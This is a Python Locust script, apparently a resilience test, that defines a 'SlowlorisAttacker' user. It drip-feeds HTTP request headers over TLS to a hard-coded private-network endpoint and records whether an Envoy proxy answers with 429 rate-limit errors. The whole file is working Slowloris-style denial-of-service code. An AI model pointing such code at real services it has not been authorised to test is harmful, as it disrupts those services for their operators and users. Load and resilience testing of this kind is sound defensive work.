import ssl
import time
import gevent
import gevent.socket as socket
from locust import User, constant, task


class SlowlorisAttacker(User):
    wait_time = constant(0.05)

    def _create_connection(self, target_host, target_port):
        """Create a TLS connection to the target."""
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(10)
        context = ssl._create_unverified_context()
        sock = context.wrap_socket(raw_sock, server_hostname=target_host)
        sock.connect((target_host, target_port))
        return sock

    @task
    def slow_loris_with_cpu(self):
        target_host = "192.168.222.155"
        target_port = 30401

        try:
            sock = self._create_connection(target_host, target_port)

            self.environment.events.request.fire(
                request_type="Slowloris",
                name="Connection_Established",
                response_time=1,
                response_length=0,
                exception=None,
            )

            for cycle in range(5):
                start_time = time.time()

                sock.send(f"GET /heavy-logic HTTP/1.1\r\n".encode("utf-8"))
                gevent.sleep(0.05)

                sock.send(f"Host: {target_host}:{target_port}\r\n".encode("utf-8"))
                gevent.sleep(0.05)

                sock.send(
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n".encode("utf-8")
                )
                gevent.sleep(0.05)

                sock.send("Connection: keep-alive\r\n".encode("utf-8"))
                gevent.sleep(0.05)

                sock.send("\r\n".encode("utf-8"))

                response_data = b""
                try:
                    while True:
                        chunk = sock.recv(128) 
                        if not chunk:
                            break
                        response_data += chunk
                        gevent.sleep(0.05)  
                        if b"\r\n\r\n" in response_data and len(response_data) > 500:
                            break
                except socket.timeout:
                    pass

                elapsed = (time.time() - start_time) * 1000

                # Parse HTTP status code from raw response
                status_code = 0
                if response_data:
                    first_line = response_data.split(b"\r\n")[0].decode("utf-8", errors="ignore")
                    parts = first_line.split(" ")
                    if len(parts) >= 2 and parts[1].isdigit():
                        status_code = int(parts[1])

                if status_code == 429:
                    self.environment.events.request.fire(
                        request_type="Slowloris",
                        name="Heavy_Request_Completed",
                        response_time=elapsed,
                        response_length=len(response_data),
                        exception=Exception("Blocked by Envoy (429 Too Many Requests)"),
                    )
                else:
                    self.environment.events.request.fire(
                        request_type="Slowloris",
                        name="Heavy_Request_Completed",
                        response_time=elapsed,
                        response_length=len(response_data),
                        exception=None,
                    )

                gevent.sleep(0.1)

            sock.close()

        except Exception as e:
            self.environment.events.request.fire(
                request_type="Slowloris",
                name="Hold_Failed",
                response_time=0,
                response_length=0,
                exception=e,
            )